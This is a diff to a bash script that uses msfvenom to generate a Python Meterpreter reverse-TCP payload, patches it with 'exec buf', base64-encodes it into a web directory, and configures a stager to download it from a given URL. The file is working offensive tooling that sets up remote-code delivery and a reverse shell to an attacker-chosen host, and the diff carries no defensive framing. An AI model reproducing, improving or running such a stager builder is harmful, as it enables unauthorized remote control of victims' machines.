@@ -9,19 +9,12 @@ shellcode="www/shellcode"
 stagerin="templates/stager.py"
 stagerout="bin/stager.py"
 msf="/opt/metasploit-framework/msfvenom"
-encoder="x86/shikata_ga_nai"
 payload="python/meterpreter/reverse_tcp"
 
 
 usage() {
     echo "[>] Usage: $0 -l <lhost> -p <lport> -u <url>"
     exit 1
-}
-
-cl() {
-    for i in {1..50} ; do
-        echo -en "\b \b"
-    done
 }
 
 while [ -n "$1" ]; do
@@ -31,7 +24,7 @@ while [ -n "$1" ]; do
         -p)
             shift; lport="$1";;
         -u)
-            shift; url="$1";;
+            shift; url="$1/shellcode";;
         *)
             echo "[!] Invalid switch"
             usage;;
@@ -46,10 +39,12 @@ for i in $tmp $shellcode $stagerout ; do
     rm $i &>/dev/null
 done
 
-echo -en "[>] Generating shellcode..."
-$msf -p $payload lhost=$lhost lport=$lport -e $encoder -f python -b "\x00" -i 5 -o $shellcode &>/dev/null && cl
-echo -en "[>] Encoding..."
-cat $shellcode | base64 > $tmp && mv $tmp $shellcode && rm $tmp &>/dev/null && cl
-echo -en "[>] Configuring stager..."
-sed 's%'"__SERVER__"'%'"$url"'%' < $stagerin > $stagerout && cl
+echo "[>] Generating shellcode..."
+$msf -p $payload lhost=$lhost lport=$lport -f python -o $shellcode &>/dev/null
+echo "[>] Patching..."
+echo "exec buf" >> $shellcode
+echo "[>] Encoding..."
+cat $shellcode | base64 > $tmp && mv $tmp $shellcode && rm $tmp &>/dev/null
+echo "[>] Configuring stager..."
+sed 's%'"__SERVER__"'%'"$url"'%' < $stagerin > $stagerout
 echo "[+] Done!!!"
